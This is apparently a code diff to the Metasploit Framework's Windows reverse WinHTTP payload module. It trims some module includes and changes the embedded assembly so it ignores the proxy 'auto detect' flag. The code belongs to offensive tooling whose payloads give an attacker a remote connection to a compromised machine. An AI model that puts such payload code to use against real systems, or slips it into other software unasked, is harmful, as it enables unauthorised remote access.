@@ -1,9 +1,6 @@
 # -*- coding: binary -*-
 
 require 'msf/core'
-require 'msf/core/payload/transport_config'
-require 'msf/core/payload/windows/block_api'
-require 'msf/core/payload/windows/exitfunk'
 require 'msf/core/payload/windows/reverse_http'
 
 module Msf
@@ -16,11 +13,10 @@ module Msf
 
 module Payload::Windows::ReverseWinHttp
 
-  include Msf::Payload::TransportConfig
   include Msf::Payload::Windows::ReverseHttp
 
   #
-  # Register reverse_http specific options
+  # Register reverse_winhttp specific options
   #
   def initialize(*args)
     super
@@ -341,11 +337,8 @@ module Payload::Windows::ReverseWinHttp
         test eax, eax          ; skip the rest of the proxy stuff if the call failed
         jz ie_proxy_setup_finish
 
-        ; check the "auto detect" flag to see if it's set, if it is, jump to the
-        ; end and let things carry on as they were
-        mov eax, [edi]
-        test eax, eax
-        jnz ie_proxy_setup_finish
+        ; we don't care about the "auto detect" flag, as it doesn't seem to
+        ; impact us at all.
 
         ; if auto detect isn't on, check if there's an auto configuration URL
         mov eax, [edi+4]
